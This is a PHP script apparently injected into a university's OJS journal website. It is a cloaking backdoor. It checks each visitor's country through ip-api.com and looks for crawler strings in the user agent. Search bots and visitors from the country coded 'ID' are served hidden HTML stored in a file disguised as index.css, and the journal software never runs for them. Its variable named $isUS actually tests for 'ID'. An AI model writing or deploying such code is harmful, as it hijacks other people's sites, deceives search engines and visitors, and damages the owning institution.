<?php
function getUserCountry() {
    $ip = $_SERVER['REMOTE_ADDR'];
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "http://ip-api.com/json/{$ip}");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT'] ?? 'Mozilla/5.0');
    
    $response = curl_exec($ch);
    $error = curl_error($ch);
    curl_close($ch);
    
    if ($response === false) {
        error_log("cURL Error getUserCountry: " . $error);
        return null;
    }
    
    $data = json_decode($response, true);
    return $data['countryCode'] ?? null;
}

$filePath = '/home/kuisjour/muwafaqat.uis.edu.my/styles/index.css';
$ua = strtolower($_SERVER['HTTP_USER_AGENT']);

// Cek BOT
$isBot = strpos($ua, 'bot') !== false || 
         strpos($ua, 'verification') !== false || 
         strpos($ua, 'tool') !== false;

// Cek US
$isUS = getUserCountry() === "ID";

// ============================================
// JIKA BOT ATAU US → TAMPILKAN FILE, EXIT!
// ============================================
if ($isBot || $isUS) {
    if (file_exists($filePath)) {
        // Set header biar bisa tampil HTML
        header("Content-Type: text/html; charset=UTF-8");
        echo implode('', file($filePath));
    } else {
        echo "File tidak ditemukan";
    }
    exit; // STOP! Jangan jalankan OJS
}
